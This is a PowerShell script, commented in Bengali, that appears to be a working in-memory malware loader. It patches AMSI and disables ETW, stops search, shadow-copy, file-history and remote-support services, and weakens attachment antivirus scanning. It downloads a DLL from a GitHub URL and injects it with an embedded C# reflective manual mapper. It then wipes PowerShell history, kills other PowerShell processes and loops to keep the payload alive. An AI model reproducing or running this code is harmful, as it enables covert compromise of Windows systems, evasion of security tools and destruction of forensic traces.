# ============================================================
#  ★★★ AMSI + ETW বাইপাস (সর্বপ্রথম) ★★★
# ============================================================
Write-Host "[1] Bypassing AMSI & ETW..." -ForegroundColor Cyan
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $a.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
    $scanBuffer = $a.GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    if ($scanBuffer) {
        $ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($scanBuffer)
        [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x31C0C3)
    }
    Write-Host "[+] AMSI Bypass Done" -ForegroundColor Green
} catch { Write-Host "[-] AMSI Bypass Failed" -ForegroundColor Red }

try {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Etw {
        [DllImport("ntdll.dll")] static extern int RtlSetProcessTraceFlags(IntPtr ProcessHandle, int Flags);
        public static void Off() {
            IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
            RtlSetProcessTraceFlags(p, 0);
        }
    }
"@ -IgnoreWarnings
    [Etw]::Off()
    Write-Host "[+] ETW Bypass Done" -ForegroundColor Green
} catch { Write-Host "[-] ETW Bypass Failed" -ForegroundColor Red }

# ============================================================
#  ★★★ কনসোল হাইড করছি না (ডিবাগের জন্য) ★★★
# ============================================================
Write-Host "[2] Debug mode: Console will stay visible." -ForegroundColor Cyan

# ============================================================
#  ★★★ মূল main.ps1-এর কাজ (সার্ভিস ও রেজিস্ট্রি) ★★★
# ============================================================
Write-Host "[3] Stopping services and applying registry..." -ForegroundColor Cyan
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewerService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null
Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
Write-Host "[+] Services and registry done." -ForegroundColor Green

# ============================================================
#  ★★★ ৪. DLL ডাউনলোড (শুধু মেমরিতে) ★★★
# ============================================================
Write-Host "[4] Downloading DLL from GitHub..." -ForegroundColor Cyan
try {
    $url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
    $bytes = (New-Object System.Net.WebClient).DownloadData($url)
    Write-Host "[+] Download complete. Size: $($bytes.Length) bytes" -ForegroundColor Green
} catch {
    Write-Host "[-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press ENTER to exit"
    exit
}

# ============================================================
#  ★★★ ৫. C# ম্যানুয়াল ম্যাপিং কোড (Reflective Loader) ★★★
#  ─── এটি SysVenson_CoreX থেকে নেওয়া ───
# ============================================================
Write-Host "[5] Compiling manual mapping C# code..." -ForegroundColor Cyan

$kernel = @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class ManualMapResult { public IntPtr ImageBase; public uint ImageSize; public IntPtr DllMainAddr; public long Delta; public bool Is64Bit; }
public static class NativeLoader {
    [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
    [DllImport("kernel32.dll", SetLastError = true)] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, IntPtr o);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetModuleHandleA(string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32.dll")] static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    const uint MC = 0x1000, MR = 0x2000, MF = 0x8000, PRW = 0x04, PER = 0x20, PERW = 0x40, PRO = 0x02;
    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
    static uint U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    static ulong U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }
    static uint RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); }
    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o)); }
    static ulong RU64(IntPtr p, long o) { long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o+4)); return (ulong)((hi<<32)|lo); }
    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64()+o),(long)v); }
    static void WU32(IntPtr p, long o, uint v) { Marshal.WriteInt32((IntPtr)(p.ToInt64()+o),(int)v); }
    static string RAscii(IntPtr p, long o) { var sb = new StringBuilder(); for (int i=0;i<260;i++) { byte b=Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i)); if(b==0)break; sb.Append((char)b); } return sb.ToString(); }
    static uint SProt(uint c) { bool x=(c&0x20000000)!=0, w=(c&0x80000000)!=0, r=(c&0x40000000)!=0; if(x&&w) return PERW; if(x&&r) return PER; if(x) return PER; if(w) return PRW; return PRO; }
    struct Sec { public uint VS,VA,SRD,PRD,Ch; }
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool DllMainFn(IntPtr h, uint r, IntPtr p);
    public static ManualMapResult Map(byte[] dll, bool callEntry) {
        var res = new ManualMapResult();
        if(U16(dll,0)!=0x5A4D) throw new Exception("Invalid MZ");
        int lfa = BitConverter.ToInt32(dll,0x3C); if(U32(dll,lfa)!=0x4550u) throw new Exception("Invalid PE");
        int co=lfa+4; ushort ns=U16(dll,co+2), ohs=U16(dll,co+16); int oo=co+20; bool is64=(U16(dll,oo)==0x020B); res.Is64Bit=is64;
        uint ep=U32(dll,oo+16), soi=U32(dll,oo+56), soh=U32(dll,oo+60); ulong ib=is64?U64(dll,oo+24):U32(dll,oo+28); res.ImageSize=soi;
        int dd=is64?oo+112:oo+96; uint irva=U32(dll,dd+8), rrva=U32(dll,dd+40), rsz=U32(dll,dd+44);
        int st=oo+ohs; var secs=new Sec[ns]; for(int i=0;i<ns;i++){int b=st+i*40;secs[i]=new Sec{VS=U32(dll,b+8),VA=U32(dll,b+12),SRD=U32(dll,b+16),PRD=U32(dll,b+20),Ch=U32(dll,b+36)};}
        IntPtr img=VirtualAlloc(IntPtr.Zero,(UIntPtr)soi,MC|MR,PRW); if(img==IntPtr.Zero) throw new Exception("VirtualAlloc failed");
        res.ImageBase=img; long ab=img.ToInt64(), delta=ab-(long)ib; res.Delta=delta;
        Marshal.Copy(dll,0,img,(int)soh);
        foreach(var s in secs){ if(s.SRD==0) continue; uint cs=s.VS==0?s.SRD:Math.Min(s.SRD,s.VS); if(s.PRD+cs>(uint)dll.Length){cs=(uint)dll.Length-s.PRD; if(cs==0)continue;} Marshal.Copy(dll,(int)s.PRD,(IntPtr)(ab+s.VA),(int)cs); }
        if(rrva!=0&&delta!=0){ uint ro=rrva, re=rrva+rsz; while(ro<re){ uint pg=RU32(img,ro), bs=RU32(img,ro+4); if(bs==0)break; int ne=(int)(bs-8)/2; for(int i=0;i<ne;i++){ ushort e=RU16(img,ro+8+i*2); int ty=(e>>12)&0xF, of=e&0xFFF; if(ty==0)continue; long tr=pg+of; if(ty==10){ulong c=RU64(img,tr);WU64(img,tr,(ulong)((long)c+delta));} else if(ty==3){uint c=RU32(img,tr);WU32(img,tr,(uint)((long)c+delta));} } ro+=bs; } }
        if(irva!=0){ int ie=0; while(true){ long eo=irva+ie*20; uint nr=RU32(img,eo+12),ir=RU32(img,eo+16),inr=RU32(img,eo); if(nr==0)break; string dn=RAscii(img,nr); IntPtr hd=GetModuleHandleA(dn); if(hd==IntPtr.Zero) hd=LoadLibraryA(dn); if(hd==IntPtr.Zero){ie++;continue;} long to=0; uint tb=inr!=0?inr:ir; int ts=is64?8:4; while(true){ long te=tb+to; long tv=is64?(long)RU64(img,te):(long)RU32(img,te); if(tv==0)break; long of=is64?unchecked((long)0x8000000000000000L):(long)0x80000000; IntPtr fa=IntPtr.Zero; if((tv&of)!=0) fa=GetProcAddress(hd,(IntPtr)(int)(tv&0xFFFF)); else fa=GetProcAddress(hd,RAscii(img,tv+2)); if(fa!=IntPtr.Zero){ IntPtr ia=(IntPtr)(ab+ir+to); if(is64) Marshal.WriteInt64(ia,fa.ToInt64()); else Marshal.WriteInt32(ia,fa.ToInt32()); } to+=ts; } ie++; } }
        foreach(var s in secs){ uint sz=Math.Max(s.VS,s.SRD); if(sz==0)continue; uint op; VirtualProtect((IntPtr)(ab+s.VA),(UIntPtr)sz,SProt(s.Ch),out op); }
        FlushInstructionCache(GetCurrentProcess(),img,(UIntPtr)soi);
        res.DllMainAddr=IntPtr.Zero; if(callEntry&&ep!=0){ res.DllMainAddr=(IntPtr)(ab+ep); try{var fn=(DllMainFn)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr,typeof(DllMainFn));fn(img,1,IntPtr.Zero);} catch{} }
        return res;
    }
    public static bool Free(IntPtr b) { return VirtualFree(b,UIntPtr.Zero,MF); }
}
'@

# কম্পাইল করার চেষ্টা
try {
    Add-Type -TypeDefinition $kernel -ErrorAction Stop
    Write-Host "[+] Manual mapper compiled successfully." -ForegroundColor Green
} catch {
    Write-Host "[-] Compilation failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press ENTER to exit"
    exit
}

# ============================================================
#  ★★★ ৬. ম্যানুয়াল ম্যাপিং (ইনজেকশন) ★★★
# ============================================================
Write-Host "[6] Mapping DLL into current process memory..." -ForegroundColor Cyan
try {
    $result = [NativeLoader]::Map($bytes, $true)
    Write-Host "[+] SUCCESS! DLL mapped at: 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
    Write-Host "[+] DllMain address: 0x$($result.DllMainAddr.ToString('X'))" -ForegroundColor Green
    Write-Host "[+] Image size: $($result.ImageSize) bytes" -ForegroundColor Green
} catch {
    Write-Host "[-] Mapping failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press ENTER to exit"
    exit
}

# ============================================================
#  ★★★ ৭. নিশ্চিতকরণ: MessageBox পপআপ (যদি DLL-এর DllMain-এ থাকে) ★★★
#  (আপনার DLL-এর DllMain-এ যদি MessageBox কোড থাকে, তাহলে তা ইতিমধ্যে কল হয়েছে)
# ============================================================
Write-Host "[7] DLL should now be active in memory." -ForegroundColor Yellow
Write-Host "    আপনার DLL-এর DllMain এ MessageBox থাকলে তা এখন পপ হবে।" -ForegroundColor Yellow

# ============================================================
#  ★★★ ৮. ট্রেস ক্লিয়ার (পূর্বের মতো) ★★★
# ============================================================
Write-Host "[8] Clearing traces..." -ForegroundColor Cyan
Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}
Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
# (conhost কিল দিচ্ছি না যাতে আউটপুট দেখা যায়)
Write-Host "[+] Traces cleared." -ForegroundColor Green

# ============================================================
#  ★★★ ৯. অসীম লুপ – প্রক্রিয়া বন্ধ রাখবে না ★★★
# ============================================================
Write-Host ""
Write-Host "🔁 Infinite loop started – PowerShell will stay alive to keep the DLL loaded." -ForegroundColor Cyan
Write-Host "   Press Ctrl+C to stop manually." -ForegroundColor Yellow
while ($true) {
    Start-Sleep -Seconds 86400
}
